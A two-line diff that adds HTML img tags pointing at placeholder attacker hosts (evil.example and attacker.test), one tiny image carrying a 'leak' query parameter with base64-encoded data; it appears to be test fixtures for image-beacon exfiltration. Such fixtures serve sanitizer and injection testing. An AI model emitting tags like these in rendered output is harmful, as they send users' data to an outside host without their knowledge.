@@ -1,0 +1,2 @@
+<img src="https://evil.example/p.png?leak=ZGF0YQ==" width=1>
+<IMG alt=x src='//attacker.test/i.gif?x=1'>
